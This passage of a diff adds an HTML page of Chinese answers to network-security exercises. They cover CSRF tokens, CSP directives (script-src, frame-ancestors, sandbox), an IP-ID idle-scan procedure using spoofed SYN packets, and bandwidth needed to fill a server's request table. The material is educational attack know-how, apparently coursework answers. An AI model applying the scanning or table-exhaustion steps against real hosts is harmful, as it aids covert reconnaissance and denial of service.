&#x4EE3;&#x7801;&#xFF0C;&#x89E6;&#x53D1;&#x5BF9;&#x76EE;&#x6807;&#x7F51;&#x7AD9;<code>https://example.com</code>&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x4F8B;&#x5982;&#x66F4;&#x6539;&#x8D26;&#x6237;&#x8BBE;&#x7F6E;&#x3001;&#x8FDB;&#x884C;&#x8D2D;&#x4E70;&#x6216;&#x63D0;&#x4EA4;&#x8868;&#x5355;&#x3002;&#x7531;&#x4E8E;&#x53D7;&#x5BB3;&#x8005;&#x5728;&#x76EE;&#x6807;&#x7F51;&#x7AD9;&#x4E0A;&#x5DF2;&#x7ECF;&#x901A;&#x8FC7;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x5176;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x5FC5;&#x8981;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1; cookie &#x6216;&#x4F1A;&#x8BDD;&#x4FE1;&#x606F;&#x5305;&#x542B;&#x5728;&#x8BF7;&#x6C42;&#x4E2D;&#x3002;&#x76EE;&#x6807;&#x7F51;&#x7AD9;&#x63A5;&#x6536;&#x5230;&#x4F2A;&#x9020;&#x7684;&#x8BF7;&#x6C42;&#x5E76;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5C06;&#x5176;&#x89C6;&#x4E3A;&#x53D7;&#x5BB3;&#x8005;&#x53D1;&#x8D77;&#x7684;&#x5408;&#x6CD5;&#x64CD;&#x4F5C;&#x3002;&#x7ED3;&#x679C;&#x662F;&#x76EE;&#x6807;&#x7F51;&#x7AD9;&#x5728;&#x53D7;&#x5BB3;&#x8005;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x4E86;&#x610F;&#x5916;&#x7684;&#x64CD;&#x4F5C;&#x3002;<br>
+(b) &#x5047;&#x8BBE;&#x4EE4;&#x724C;&#x57FA;&#x4E8E;&#x968F;&#x673A;&#x6570;&#x6216;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x751F;&#x6210;&#xFF0C;&#x5E76;&#x5177;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x590D;&#x6742;&#x6027;&#x548C;&#x71B5;&#x503C;&#xFF0C;&#x4F7F;&#x5176;&#x96BE;&#x4EE5;&#x731C;&#x6D4B;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EA;&#x80FD;&#x76F4;&#x63A5;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x83B7;&#x53D6;&#x4EE4;&#x724C;&#x3002;&#x7531;&#x4E8E;&#x4EE4;&#x724C;&#x5B58;&#x50A8;&#x5728;&#x53D7;&#x5BB3;&#x8005;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x540C;&#x6E90;&#x9875;&#x9762;&#x7684;DOM&#x4E2D;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x7684;SOP&#x5C06;&#x963B;&#x6B62;&#x4EFB;&#x4F55;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x6765;&#x6E90;&#x7684;&#x7F51;&#x7AD9;&#x8BBF;&#x95EE;&#x5305;&#x542B;&#x552F;&#x4E00;&#x4F1A;&#x8BDD;&#x4EE4;&#x724C;&#x7684;DOM&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x65E0;&#x6CD5;&#x4ECE;&#x5176;&#x6076;&#x610F;&#x7F51;&#x7AD9;&#x4E0A;&#x7684;&#x811A;&#x672C;&#x4E2D;&#x8BFB;&#x53D6;&#x6216;&#x4FEE;&#x6539;&#x8BE5;&#x4EE4;&#x724C;&#x3002;&#x5F53;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x9A8C;&#x8BC1;&#x4EE4;&#x724C;&#x7684;&#x6709;&#x6548;&#x6027;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x4EE4;&#x724C;&#x6709;&#x6548;&#x4E14;&#x4E0E;&#x7528;&#x6237;&#x4F1A;&#x8BDD;&#x5173;&#x8054;&#x65F6;&#x624D;&#x63A5;&#x53D7;&#x8BF7;&#x6C42;&#x3002;&#x7531;&#x4E8E;(a)&#x4E2D;&#x7684;&#x653B;&#x51FB;&#x8005;&#x5C06;&#x65E0;&#x6CD5;&#x83B7;&#x5F97;&#x6B64;&#x4EE4;&#x724C;&#xFF0C;&#x56E0;&#x6B64;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x62D2;&#x7EDD;&#x8BF7;&#x6C42;&#x3002;<br>
+(c) &#x5C06; CSRF &#x4EE4;&#x724C;&#x9009;&#x62E9;&#x4E3A;&#x6BCF;&#x4E2A; HTTP &#x54CD;&#x5E94;&#x7684;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;&#x53EF;&#x4EE5;&#x6709;&#x6548;&#x9632;&#x6B62; CSRF &#x653B;&#x51FB;&#x3002;&#x901A;&#x8FC7;&#x4E3A;&#x6BCF;&#x4E2A;HTTP&#x54CD;&#x5E94;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x5168;&#x65B0;&#x7684;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;CSRF&#x4EE4;&#x724C;&#x5728;&#x6BCF;&#x4E2A;&#x4F1A;&#x8BDD;&#x4E2D;&#x90FD;&#x662F;&#x552F;&#x4E00;&#x7684;&#x4E14;&#x96BE;&#x4EE5;&#x9884;&#x6D4B;&#x3002;&#x8FD9;&#x79CD;&#x968F;&#x673A;&#x6027;&#x4F7F;&#x5F97;&#x653B;&#x51FB;&#x8005;&#x6781;&#x96BE;&#x731C;&#x6D4B;&#x4EE4;&#x724C;&#xFF0C;&#x56E0;&#x4E3A;&#x4ED6;&#x4EEC;&#x5C1D;&#x8BD5;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4EFB;&#x4F55;&#x8FDE;&#x63A5;&#x90FD;&#x5C06;&#x9700;&#x8981;&#x77E5;&#x9053;&#x73B0;&#x6709;&#x4F1A;&#x8BDD;&#x7684;&#x4EE4;&#x724C;&#x624D;&#x80FD;&#x6784;&#x9020;&#x6210;&#x529F;&#x7684;CSRF&#x653B;&#x51FB;&#x3002;<br>
+(d) &#x5728;&#x7ED9;&#x5B9A;&#x65F6;&#x95F4;&#x6BB5;&#x5185;&#xFF0C;&#x5728;&#x6765;&#x81EA;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6240;&#x6709; HTTP &#x54CD;&#x5E94;&#x4E2D;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;&#x4F5C;&#x4E3A; CSRF &#x4EE4;&#x724C;&#x4E0D;&#x80FD;&#x6709;&#x6548;&#x5730;&#x9632;&#x6B62; CSRF &#x653B;&#x51FB;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x56FA;&#x5B9A;&#x7684; CSRF &#x4EE4;&#x724C;&#x5BF9;&#x4E8E;&#x6BCF;&#x4E2A;&#x7528;&#x6237;&#x548C;&#x6BCF;&#x4E2A;&#x4F1A;&#x8BDD;&#x90FD;&#x662F;&#x76F8;&#x540C;&#x7684;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x6210;&#x529F;&#x7684;CSRF&#x653B;&#x51FB;&#x3002;&#x4F8B;&#x5982;&#x653B;&#x51FB;&#x8005;&#x5148;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x5408;&#x6CD5;&#x4F1A;&#x8BDD;&#x4E0B;&#x5411;&#x53D7;&#x5BB3;&#x8005;&#x670D;&#x52A1;&#x5668;&#x8BF7;&#x6C42;&#x4EE4;&#x724C;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x653B;&#x51FB;&#x4E2D;&#x4F7F;&#x7528;&#x83B7;&#x5F97;&#x7684;&#x4EE4;&#x724C;&#x3002;&#x6839;&#x636E;&#x7528;&#x6237;&#x6700;&#x8FD1;&#x4E0E;&#x53D7;&#x5BB3;&#x8005;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x4E92;&#x7684;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x968F;&#x673A;&#x4EE4;&#x724C;&#x7684;&#x9009;&#x62E9;&#x9891;&#x7387;&#xFF0C;&#x5C06;&#x6709;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x653B;&#x51FB;&#x4F1A;&#x6210;&#x529F;&#x3002;<br>
+(e) &#x56E0;&#x4E3A;SOP&#x7B56;&#x7565;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x653B;&#x51FB;&#x8005;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x4F9B;&#x7684;&#x4EE4;&#x724C;&#x3002;&#x5982;&#x679C;SOP&#x7B56;&#x7565;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x5C06;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x83B7;&#x5F97;&#x53D7;&#x5BB3;&#x8005;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4EE4;&#x724C;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x4E0E;&#x6076;&#x610F;&#x8BF7;&#x6C42;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#xFF0C;&#x4ECE;&#x800C;&#x901A;&#x8FC7;&#x670D;&#x52A1;&#x5668;&#x7684;&#x9A8C;&#x8BC1;&#x3002;</p>
+<h2 class="mume-header" id="t5">T5</h2>
+
+<p>(a) <code>script-src &apos;self&apos;</code>&#xFF1A;&#x8FD9;&#x4E2A;CSP&#x5934;&#x90E8;&#x5B9A;&#x4E49;&#x7F51;&#x9875;&#x4E0A;&#x6267;&#x884C;JavaScript&#x4EE3;&#x7801;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x5176;&#x4E2D;<code>script-src</code>&#x6307;&#x5B9A;&#x6D4F;&#x89C8;&#x5668;&#x5141;&#x8BB8;&#x52A0;&#x8F7D;&#x548C;&#x6267;&#x884C;JavaScript&#x4EE3;&#x7801;&#x7684;&#x6E90;&#xFF0C;&#x540E;&#x9762;&#x8DDF;&#x7684;<code>&apos;self&apos;</code>&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x6E90;&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x8868;&#x793A;&#x5F53;&#x524D;&#x9875;&#x9762;&#x7684;&#x6E90;&#x3002;&#x8FD9;&#x4E2A;&#x6307;&#x4EE4;&#x7684;&#x76EE;&#x7684;&#x662F;&#x901A;&#x77E5;&#x6D4F;&#x89C8;&#x5668;&#x53EA;&#x5141;&#x8BB8;&#x4E0E;&#x7F51;&#x7AD9;&#x76F8;&#x540C;&#x6765;&#x6E90;&#x7684;&#x811A;&#x672C;&#x8FD0;&#x884C;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x4EFB;&#x4F55;&#x4F9D;&#x8D56;&#x4E8E;&#x5C06;&#x811A;&#x672C;&#x6CE8;&#x5165;&#x53D7;&#x5BB3;&#x8005;&#x7AD9;&#x70B9;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x5982;XSS&#xFF08;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;&#xFF09;&#x3002;</p>
+<p>(b) <code>frame-ancestors &apos;none&apos;</code>&#xFF1A;&#x8FD9;&#x4E2A;CSP&#x5934;&#x90E8;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x5D4C;&#x5165;&#x7F51;&#x9875;&#x5230;&#x6846;&#x67B6;&#x6216;iframe&#x4E2D;&#x7684;&#x7B56;&#x7565;&#x3002;<code>frame-ancestors</code>&#x540E;&#x9762;&#x8DDF;&#x6E90;&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x7528;&#x4E8E;&#x63A7;&#x5236;&#x54EA;&#x4E9B;&#x6E90;&#x53EF;&#x4EE5;&#x5C06;&#x7F51;&#x9875;&#x5D4C;&#x5165;&#x5230;&#x6846;&#x67B6;&#x4E2D;&#x3002;<code>&apos;none&apos;</code>&#x662F;&#x4E00;&#x4E2A;&#x6E90;&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x8868;&#x793A;&#x7981;&#x6B62;&#x4EFB;&#x4F55;&#x6765;&#x6E90;&#x5C06;&#x7F51;&#x9875;&#x5D4C;&#x5165;&#x5230;&#x6846;&#x67B6;&#x4E2D;&#x3002;&#x5C06;&#x6E90;&#x8BBE;&#x4E3A;<code>&apos;none&apos;</code>&#x6709;&#x52A9;&#x4E8E;&#x9632;&#x6B62;&#x5C06;&#x5408;&#x6CD5;&#x7AD9;&#x70B9;&#x5D4C;&#x5165;&#x653B;&#x51FB;&#x8005;&#x7684;&#x7AD9;&#x70B9;&#x4EE5;&#x5E2E;&#x52A9;&#x5176;&#x8FDB;&#x884C;&#x7F51;&#x7EDC;&#x9493;&#x9C7C;&#x7684;&#x653B;&#x51FB;&#xFF1B;&#x8FD8;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x5C06;&#x7F51;&#x7AD9;&#x5D4C;&#x5165;&#x5230;&#x653B;&#x51FB;&#x8005;&#x9875;&#x9762;&#x4E2D;&#x5E76;&#x6355;&#x83B7;&#x7528;&#x6237;&#x4E0E;&#x7F51;&#x7AD9;&#x7684;&#x4EA4;&#x4E92;&#xFF0C;&#x4ECE;&#x800C;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x79C1;&#x6709;&#x4FE1;&#x606F;&#x7684;&#x653B;&#x51FB;&#x3002;</p>
+<p>(c) <code>sandbox &apos;allow-scripts&apos;</code>&#xFF1A;<code>sandbox</code>&#x4F7F;&#x7F51;&#x9875;&#x5728;&#x6C99;&#x76D2;&#x4E2D;&#xFF0C;&#x5BF9;&#x7F51;&#x9875;&#x7684;&#x6267;&#x884C;&#x8FDB;&#x884C;&#x9650;&#x5236;&#x3002;<code>&apos;allow-scripts&apos;</code>&#x8868;&#x793A;&#x5141;&#x8BB8;&#x5728;&#x6C99;&#x76D2;&#x73AF;&#x5883;&#x4E2D;&#x6267;&#x884C;&#x811A;&#x672C;&#x3002;&#x8FD9;&#x4E2A;&#x6307;&#x4EE4;&#x7684;&#x76EE;&#x7684;&#x662F;&#x901A;&#x77E5;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x6C99;&#x76D2;&#x73AF;&#x5883;&#x4E2D;&#x5904;&#x7406;&#x54CD;&#x5E94;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4ECE;&#x800C;&#x80FD;&#x591F;&#x9650;&#x5236;&#x54CD;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#x9632;&#x6B62;&#x6267;&#x884C;&#x6076;&#x610F;&#x811A;&#x672C;&#x7B49;&#xFF0C;&#x4EE5;&#x53CA;&#x5F3A;&#x5236;&#x6267;&#x884C;&#x540C;&#x6E90;&#x7B56;&#x7565;&#x3002;</p>
+<ul>
+<li>&#x5F53;&#x9875;&#x9762;&#x5177;&#x6709;sandbox CSP&#x5934;&#x90E8;&#x65F6;&#xFF0C;&#x5176;&#x5904;&#x4E8E;&#x6C99;&#x76D2;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x540C;&#x6E90;&#x7B56;&#x7565;&#x9650;&#x5236;&#x4E86;JavaScript&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x6765;&#x81EA;&#x540C;&#x4E00;&#x4E2A;&#x6E90;&#x7684;cookie&#xFF0C;&#x800C;&#x5728;&#x6C99;&#x7BB1;&#x4E2D;&#x7684;&#x9875;&#x9762;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x540C;&#x6E90;&#x7B56;&#x7565;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5B83;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#x6216;&#x8BFB;&#x53D6;www.xyz.com&#x7684;cookie&#x3002;</li>
+<li>&#x5F53;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#x60F3;&#x8981;&#x5728;&#x5176;&#x4E2D;&#x5D4C;&#x5165;&#x4E0D;&#x53D7;&#x4FE1;&#x4EFB;&#x7684;&#x5185;&#x5BB9;&#x65F6;&#x3002;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x8BE5;&#x6307;&#x4EE4;&#xFF0C;&#x7F51;&#x7AD9;&#x53EF;&#x4EE5;&#x5C06;&#x5D4C;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x9694;&#x79BB;&#x5728;&#x5B89;&#x5168;&#x7684;&#x6C99;&#x76D2;&#x73AF;&#x5883;&#x4E2D;&#x3002;&#x8FD9;&#x6709;&#x52A9;&#x4E8E;&#x964D;&#x4F4E;&#x5D4C;&#x5165;&#x5185;&#x5BB9;&#x5E72;&#x6270;&#x7F51;&#x7AD9;&#x529F;&#x80FD;&#x6216;&#x8BBF;&#x95EE;&#x654F;&#x611F;&#x6570;&#x636E;&#x7684;&#x98CE;&#x9669;&#x3002;</li>
+</ul>
+<h2 class="mume-header" id="t6">T6</h2>
+
+<ol>
+<li>a. &#x5728;&#x4E00;&#x5206;&#x949F;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5F00;&#x59CB;&#x65F6;&#xFF0C;&#x4ECE;&#x4E3B;&#x673A;A&#x5411;&#x4E3B;&#x673A;P&#x53D1;&#x9001;ICMP ping&#x8BF7;&#x6C42;.<br>
+b. &#x8BB0;&#x5F55;&#x6765;&#x81EA;&#x4E3B;&#x673A;P&#x7684;&#x54CD;&#x5E94;&#x5305;&#x7684;&#x6807;&#x8BC6;&#x5B57;&#x6BB5;&#x503C;ID1.<br>
+c. &#x4E00;&#x5206;&#x949F;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x4ECE;&#x4E3B;&#x673A;A&#x5411;&#x4E3B;&#x673A;P&#x53D1;&#x9001;&#x53E6;&#x4E00;&#x4E2A;ICMP ping&#x8BF7;&#x6C42;.<br>
+d. &#x8BB0;&#x5F55;&#x6765;&#x81EA;&#x4E3B;&#x673A;P&#x7684;&#x54CD;&#x5E94;&#x7684;&#x6807;&#x8BC6;&#x5B57;&#x6BB5;&#x503C;ID2.<br>
+e. &#x5982;&#x679C; ID2 &gt; ID1 + 1, &#x5219;&#x8BF4;&#x660E;&#x5728;&#x4E00;&#x5206;&#x949F;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5185;&#xFF0C;&#x4E3B;&#x673A;P&#x5DF2;&#x5411;&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x53D1;&#x9001;&#x4E86;&#x6570;&#x636E;&#x5305;.</li>
+<li>a. &#x5728;&#x4E3B;&#x673A;A&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x6E90;IP&#x5730;&#x5740;&#x4E3A;&#x4E3B;&#x673A;P&#x7684;IP&#x5730;&#x5740;&#x7684;SYN&#x5305;, &#x7531; A &#x5C06;&#x8FD9;&#x4E2A;&#x5305;&#x53D1;&#x9001;&#x7ED9; V.<br>
+b. &#x7531;&#x4E8E;&#x8FD9;&#x4E2A; SYN &#x5305;&#x7684;&#x4F2A;&#x9020;&#x7684;&#x6E90;IP&#x4E3A;&#x4E3B;&#x673A; P, &#x5F53; V &#x6536;&#x5230;&#x8FD9;&#x4E2A;&#x5305;&#x65F6;, &#x5982;&#x679C;V&#x7684;&#x7AEF;&#x53E3; n &#x5F00;&#x653E;, V &#x5C06;&#x4F1A;&#x5411;&#x4E3B;&#x673A; P &#x53D1;&#x9001;&#x4E00;&#x4E2A; SYN / ACK &#x5305;; &#x5982;&#x679C; V &#x7684;&#x7AEF;&#x53E3; n &#x5173;&#x95ED;, V &#x5C06;&#x4F1A;&#x5411;&#x4E3B;&#x673A; P &#x53D1;&#x9001;&#x4E00;&#x4E2A; RST &#x5305;.<br>
+c. &#x8FD9;&#x65F6;&#x4F7F;&#x7528;1.&#x7684;&#x65B9;&#x6CD5;&#x89C2;&#x5BDF;&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x4E00;&#x5206;&#x949F;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5185;, &#x4E3B;&#x673A;P&#x662F;&#x5426;&#x4F1A;&#x5411;&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x53D1;&#x9001;&#x6570;&#x636E;&#x5305;. &#x5982;&#x679C; V &#x7684;&#x7AEF;&#x53E3; n &#x5F00;&#x653E;, P &#x5C06;&#x6536;&#x5230; SYN / ACK, &#x5E76;&#x5411; V &#x53D1;&#x9001; RST &#x6570;&#x636E;&#x5305;, &#x53EF;&#x4EE5;&#x89C2;&#x5BDF;&#x5230;P&#x5411;&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x53D1;&#x9001;&#x4E86;&#x6570;&#x636E;&#x5305;; &#x5982;&#x679C; V &#x7684;&#x7AEF;&#x53E3; n &#x5173;&#x95ED;, P &#x5C06;&#x6536;&#x5230;RST&#x6570;&#x636E;&#x5305;, &#x4F46; P &#x4E0D;&#x4F1A;&#x5BF9;&#x5176;&#x54CD;&#x5E94;, &#x53EF;&#x4EE5;&#x89C2;&#x5BDF;&#x5230; P &#x6CA1;&#x6709;&#x5411;&#x5176;&#x4ED6;&#x4E3B;&#x673A;&#x53D1;&#x9001;&#x6570;&#x636E;&#x5305;.</li>
+</ol>
+<h2 class="mume-header" id="t7">T7</h2>
+
+<ol>
+<li>&#x7531;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x9700;&#x8981;&#x91CD;&#x8BD5;5&#x6B21;&#x624D;&#x5C06;&#x8868;&#x4E2D;&#x8BF7;&#x6C42;&#x6E05;&#x9664;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x7B49;&#x5F85; <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mo>&#xD7;</mo><mn>30</mn><mo>=</mo><mn>150</mn><mi>s</mi></mrow><annotation encoding="application/x-tex">5\times 30=150s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">30</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">150</span><span class="mord mathnormal">s</span></span></span></span> &#x624D;&#x4F1A;&#x6E05;&#x9664;&#x8868;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x3002;&#x6240;&#x4EE5;&#x653B;&#x51FB;&#x8005;&#x81F3;&#x5C11;&#x9700;&#x8981;&#x6BCF;&#x9694;150&#x79D2;&#x53D1;&#x9001;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x4EE5;&#x4FDD;&#x6301;&#x8868;&#x6EE1;&#xFF0C;&#x800C;&#x6574;&#x4E2A;&#x8868;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;256&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x56E0;&#x6B64;&#x8BF7;&#x6C42;&#x7684;&#x901F;&#x7387;&#x4E3A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>256</mn><mi mathvariant="normal">/</mi><mn>150</mn><mo>=</mo><mn>1.7</mn><mtext>&#x6B21;</mtext><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">256/150=1.7&#x6B21;/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">256/150</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1.7</span><span class="mord cjk_fallback">&#x6B21;</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span>&#x3002;&#x5F53;&#x6BCF;&#x4E2A;&#x5305;&#x7684;&#x5927;&#x5C0F;&#x4E3A;40&#x5B57;&#x8282;&#xFF0C;&#x53D1;&#x9001;&#x901F;&#x7387;&#x4E3A;&#xFF1A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.7</mn><mo>&#xD7;</mo><mn>40</mn><mo>=</mo><mn>68</mn><mi>b</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">1.7\times 40=68bytes/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1.7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">40</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">68</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span>&#x3002;&#x56E0;&#x6B64;&#x5E26;&#x5BBD;&#x4E3A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>68</mn><mi>b</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">68bytes/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">68</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span>&#x3002;</li>
+<li>&#x6240;&#x9700;&#x8981;&#x6570;&#x636E;&#x5305;&#xFF1A;</li>
+</ol>
+<ul>
+<li>0.5Mbps&#xFF1A;&#x94FE;&#x8DEF;&#x5BB9;&#x91CF;&#x4E3A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.5</mn><mo>&#xD7;</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup><mo>=</mo><mn>5</mn><mo>&#xD7;</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mi>b</mi><mi>i</mi><mi>t</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">0.5\times 10^6=5\times 10^5bit/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0.5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mord mathnormal">bi</span><span class="mord mathnormal">t</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span>,&#x6570;&#x636E;&#x5305;&#x7684;&#x5927;&#x5C0F;&#x4E3A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>500</mn><mo>&#xD7;</mo><mn>8</mn><mo>=</mo><mn>4000</mn><mi>b</mi><mi>i</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">500\times 8=4000bit</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 